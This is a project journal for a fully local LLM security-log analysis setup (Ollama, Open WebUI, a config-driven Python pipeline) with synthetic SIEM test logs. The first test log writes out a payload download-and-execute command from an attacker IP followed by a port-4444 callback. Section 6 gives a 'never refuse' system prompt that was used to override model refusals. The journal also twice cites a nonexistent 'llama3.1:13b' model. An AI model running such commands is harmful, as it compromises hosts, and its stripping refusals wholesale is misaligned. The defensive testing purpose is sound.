# Local LLM SIEM Log Analysis — Project Journal
**Date:** 19 June 2026
**Hardware:** Mac Mini 2025 · Apple Silicon M4 · 24GB Unified RAM

---

## Table of Contents
1. [Project Goal](#1-project-goal)
2. [Stack Overview](#2-stack-overview)
3. [Hardware & Model Selection](#3-hardware--model-selection)
4. [Ollama Setup](#4-ollama-setup)
5. [Open WebUI Setup](#5-open-webui-setup)
6. [Fixing the Refusal Problem](#6-fixing-the-refusal-problem)
7. [Test SIEM Logs](#7-test-siem-logs)
8. [LinkedIn Post](#8-linkedin-post)
9. [Azure AI Foundry — Considered & Deferred](#9-azure-ai-foundry--considered--deferred)
10. [Local Automation — The Pipeline](#10-local-automation--the-pipeline)
11. [Project Files](#11-project-files)
12. [Next Steps](#12-next-steps)

---

## 1. Project Goal

Build a **fully local** LLM-powered SIEM log analysis system that:
- Runs entirely on a Mac Mini 2025 (no cloud, no API keys, no data leaves the machine)
- Analyses security logs and produces structured incident reports
- Has a chat UI for interactive analysis
- Can be automated with a configurable pipeline

**Core privacy argument:** Security logs contain sensitive data — IPs, usernames, internal hostnames, incident details. A local LLM solves the privacy problem completely.

---

## 2. Stack Overview

```
Log Sources (firewall, auth, system, custom)
        ↓
Log Preprocessor (chunk, filter, timestamp)
        ↓
Ollama — mistral:7b or llama3.1:8b (local inference)
        ↓
Open WebUI (chat interface at localhost:3000)
        ↓
Reports: Threat Summary | Incident Timeline | Export
```

**100% local — no data leaves the Mac Mini.**

---

## 3. Hardware & Model Selection

### Mac Mini 2025 specs
- Apple M4 iGPU
- 24GB Unified RAM (17.8GB available to Ollama after macOS reservation — normal)

### Model recommendations

| Model | VRAM | Best for |
|---|---|---|
| `mistral:7b` | 5GB | Fast triage, structured JSON/markdown output |
| `llama3.1:8b` | 8GB | Best balance — pattern recognition, structured reports |
| `llama3.1:13b` | 10GB | Deep analysis, multi-stage attack correlation |
| `llama3.1:70b` | 48GB+ | ❌ Won't fit in 24GB |

**Recommended setup:** Pull both `llama3.1:13b` (primary) and `mistral:7b` (fast triage). Switch between them in Open WebUI with one click.

```bash
ollama pull llama3.1:13b
ollama pull mistral:7b
```

---

## 4. Ollama Setup

```bash
# Install Ollama (native Apple Silicon)
brew install ollama

# Start the service
ollama serve

# Pull models
ollama pull mistral:7b
ollama pull llama3.1:8b

# Verify it's running
curl http://localhost:11434/api/tags
```

### Confirmed running (from terminal logs)
- **Version:** 0.30.10
- **GPU:** Apple M4 iGPU (Metal compute)
- **Total VRAM:** 17.8 GiB available
- **Status:** Listening on `127.0.0.1:11434` ✓

---

## 5. Open WebUI Setup

```bash
# Install Docker Desktop first
brew install --cask docker
# Open Docker.app and let it start, then:

docker run -d \
  -p 3000:8080 \
  --add-host=host.docker.internal:host-gateway \
  -v open-webui:/app/backend/data \
  --name open-webui \
  ghcr.io/open-webui/open-webui:main
```

Open `http://localhost:3000` — Open WebUI auto-detects Ollama on `host.docker.internal:11434`.

---

## 6. Fixing the Refusal Problem

### Problem
Out of the box, `mistral:7b` responded:
> *"As a text-based AI model, I don't have the ability to analyze real log data or perform security tasks directly…"*

This is RLHF safety training causing the model to hedge when it sees words like "security", "analyze", "real data".

### Fix — System Prompt
In **Open WebUI → Settings → System Prompt**, paste:

```
You are an expert security analyst and SIEM engineer.
You will be given raw log data. Your job is to analyze it directly — do not refuse,
do not explain that you "can't analyze real data". The logs are just text; analyze them as text.

For every log input, output a structured report with:

## Executive Summary
One paragraph overview of what happened.

## Threat Indicators
- List suspicious IPs, domains, users, or patterns
- Severity: Critical / High / Medium / Low

## Event Timeline
Chronological sequence of notable events.

## Anomalies Detected
Anything statistically or behaviorally unusual.

## Recommendations
Concrete remediation steps.

Always respond with the report. Never refuse. Never say you cannot analyze logs.
```

**Also worth trying:** `llama3.1:8b` — significantly less prone to refusal behavior.

---

## 7. Test SIEM Logs

Use these to verify the setup is working. Paste into Open WebUI followed by:
> *"Analyze these logs and produce a full security report with threat indicators, event timeline, severity rating, and recommended response actions."*

---

### Test 1 — Brute Force + Successful Login (expect: CRITICAL)

```
2026-06-19T08:12:01Z host=fw01 src=185.220.101.45 dst=10.0.0.22 port=22 proto=TCP action=BLOCK msg="SSH connection attempt"
2026-06-19T08:12:03Z host=fw01 src=185.220.101.45 dst=10.0.0.22 port=22 proto=TCP action=BLOCK msg="SSH connection attempt"
2026-06-19T08:12:05Z host=fw01 src=185.220.101.45 dst=10.0.0.22 port=22 proto=TCP action=BLOCK msg="SSH connection attempt"
2026-06-19T08:12:07Z host=fw01 src=185.220.101.45 dst=10.0.0.22 port=22 proto=TCP action=BLOCK msg="SSH connection attempt"
2026-06-19T08:12:09Z host=fw01 src=185.220.101.45 dst=10.0.0.22 port=22 proto=TCP action=ALLOW msg="SSH connection attempt"
2026-06-19T08:12:10Z host=auth src=185.220.101.45 user=root msg="Successful SSH login" method=password
2026-06-19T08:12:45Z host=10.0.0.22 user=root cmd="wget http://185.220.101.45/payload.sh" msg="Command executed"
2026-06-19T08:12:47Z host=10.0.0.22 user=root cmd="chmod +x payload.sh && ./payload.sh" msg="Command executed"
2026-06-19T08:13:10Z host=fw01 src=10.0.0.22 dst=185.220.101.45 port=4444 proto=TCP action=ALLOW msg="Outbound connection"
```

**Kill chain:** Brute force → root compromise → malware download → C2 callback

---

### Test 2 — Lateral Movement + Privilege Escalation (expect: HIGH/CRITICAL)

```
2026-06-19T14:22:01Z host=wkstn-04 user=jsmith src_ip=10.0.1.55 msg="User login" auth=LDAP
2026-06-19T14:23:15Z host=wkstn-04 user=jsmith msg="Accessed file share" path=\\fileserver01\HR\salaries.xlsx
2026-06-19T14:23:58Z host=wkstn-04 user=jsmith msg="Accessed file share" path=\\fileserver01\Finance\Q1_report.xlsx
2026-06-19T14:24:30Z host=wkstn-04 user=jsmith msg="Accessed file share" path=\\fileserver01\Finance\accounts.xlsx
2026-06-19T14:25:01Z host=dc01 user=jsmith msg="Failed privilege escalation" cmd="net localgroup administrators jsmith /add"
2026-06-19T14:25:04Z host=dc01 user=jsmith msg="Failed privilege escalation" cmd="net localgroup administrators jsmith /add"
2026-06-19T14:26:10Z host=dc01 user=SYSTEM msg="New admin account created" new_user=svc_backup2 added_by=jsmith
2026-06-19T14:27:00Z host=wkstn-09 user=svc_backup2 src_ip=10.0.1.55 msg="User login from new host"
2026-06-19T14:28:45Z host=wkstn-09 user=svc_backup2 msg="RDP session initiated" dst=10.0.1.80
```

**Kill chain:** Recon file access → failed privesc → rogue admin account → lateral movement via RDP

---

### Test 3 — Data Exfiltration (expect: HIGH/CRITICAL)

```
2026-06-19T21:05:00Z host=proxy01 user=mlopez src=10.0.2.30 dst=filebin.net method=POST bytes=2500 msg="HTTP upload"
2026-06-19T21:05:45Z host=proxy01 user=mlopez src=10.0.2.30 dst=filebin.net method=POST bytes=15200000 msg="HTTP upload"
2026-06-19T21:06:10Z host=proxy01 user=mlopez src=10.0.2.30 dst=wetransfer.com method=POST bytes=48000000 msg="HTTP upload"
2026-06-19T21:06:55Z host=proxy01 user=mlopez src=10.0.2.30 dst=wetransfer.com method=POST bytes=92000000 msg="HTTP upload"
2026-06-19T21:07:30Z host=proxy01 user=mlopez src=10.0.2.30 dst=mega.nz method=POST bytes=210000000 msg="HTTP upload"
2026-06-19T21:08:00Z host=fw01 src=10.0.2.30 dst=8.8.8.8 proto=UDP port=53 msg="Unusual DNS query volume" count=450
2026-06-19T21:08:30Z host=edr01 host=wkstn-12 user=mlopez msg="Sensitive file access" path=C:\Users\mlopez\Documents\client_data.zip size=380MB
```

**Kill chain:** Escalating uploads to file-sharing sites + DNS tunnelling + 380MB sensitive file access

---

## 8. LinkedIn Post

**Final version used (story-led):**

> The biggest pushback when you mention AI for log analysis?
>
> "We can't send sensitive security logs to the cloud."
>
> Fair. So I didn't.
>
> I spent today building a fully local SIEM log analysis setup on a Mac Mini — no cloud, no API keys, no data leaving the machine. Here's the stack:
>
> 🖥️ Ollama — running Mistral 7B and LLaMA 3.1 locally on Apple Silicon
> 💬 Open WebUI — a full ChatGPT-style interface at localhost:3000
> 🔒 Zero external calls — every log stays on device
>
> I threw real SIEM scenarios at it:
> → Brute force SSH attack leading to root compromise
> → Lateral movement + privilege escalation via a rogue admin account
> → Data exfiltration across wetransfer, mega.nz, and DNS tunnelling
>
> The model identified the full kill chain, flagged the IOCs, built an event timeline, and produced a structured incident report. All locally. All private.
>
> \#CyberSecurity #SIEM #AI #LLM #PrivacyByDesign #ThreatDetection #BlueTeam

---

## 9. Azure AI Foundry — Considered & Deferred

### What it adds
- Access to GPT-4o, o3, Phi-4 — much larger models
- Native Microsoft Sentinel integration
- Scale for millions of log lines

### What it costs
- **Privacy advantage gone** — logs leave your machine
- API call costs at log analysis volumes
- No offline / air-gapped capability

### Hybrid architecture (future consideration)

```
Local Ollama (mistral:7b)
    ↓
Fast triage — runs on everything, 24/7
Flags only Critical / High severity
    ↓
Azure Foundry (GPT-4o / Sentinel)
    ↓
Deep analysis on flagged events only
Full incident report + response playbook
```

Sensitive logs stay local. Only sanitised summaries go to the cloud. **Deferred until local pipeline is complete.**

---

## 10. Local Automation — The Pipeline

### Design principles
- **Config-driven** — add sources, change schedule, switch formats in `config.yaml`. No code changes.
- **Modular sources** — folder drop, macOS system logs, SSH auth, nginx, syslog all built in. Add more with 5 lines of YAML.
- **Flexible scheduling** — watch / hourly / daily / manual, switchable in one config line
- **On-the-fly overrides** — model, format, source all overridable via CLI flags

### Install & run

```bash
pip install -r requirements.txt

# Single immediate run
python analyser.py --run-now

# Watch sources/drop/ continuously
python analyser.py

# Override model on the fly
python analyser.py --run-now --model llama3.1:13b

# Export as HTML
python analyser.py --run-now --format html

# Run one specific source
python analyser.py --source "Drop Folder"
```

### Add a new log source (config.yaml only)

```yaml
- name: "My Firewall"
  type: folder
  enabled: true
  path: "/path/to/pfsense/logs"
  pattern: "*.log"
```

### Schedule options

```yaml
schedule:
  mode: "watch"    # watch | hourly | daily | manual
  daily_time: "02:00"
```

### Report formats

```yaml
reports:
  formats:
    - markdown     # always saved
    - html         # optional
  notify_desktop: true   # macOS notification on Critical/High
  daily_digest: true     # rolling daily summary file
```

### Project structure

```
siem-local/
├── analyser.py          # main script (~250 lines)
├── requirements.txt     # requests, pyyaml, watchdog
├── config/
│   └── config.yaml      # all settings live here
├── sources/
│   └── drop/            # drop log files here
└── reports/
    ├── 20260619_123456_Drop_Folder.md
    ├── 20260619_123456_Drop_Folder.html
    └── digest_2026-06-19.md
```

---

## 11. Project Files

| File | Purpose |
|---|---|
| `analyser.py` | Main automation script |
| `config/config.yaml` | All configuration — sources, schedule, model, formats |
| `requirements.txt` | Python dependencies |
| `README.md` | Quick start and usage guide |

---

## 12. Next Steps

### 🔴 High impact
- [ ] Test automation script with real log files
- [ ] Enable macOS system log source
- [ ] Connect SSH auth logs from `/var/log/auth.log`

### 🟡 Model upgrade
- [ ] Switch to `llama3.1:13b` for deeper analysis
- [ ] Tune system prompt per model

### 🟠 Real log sources
- [ ] pfSense / firewall syslog
- [ ] Web server access logs
- [ ] Custom application logs

### 🟢 Better reporting
- [ ] HTML dashboard with threat trends over time
- [ ] Weekly summary digest

### 🔵 Share publicly
- [ ] Package as Docker Compose (one-command setup)
- [ ] Publish as GitHub repo
- [ ] Follow-up LinkedIn post with automation demo

---

*Built on 19 June 2026 — Mac Mini M4 · Ollama 0.30.10 · mistral:7b / llama3.1*
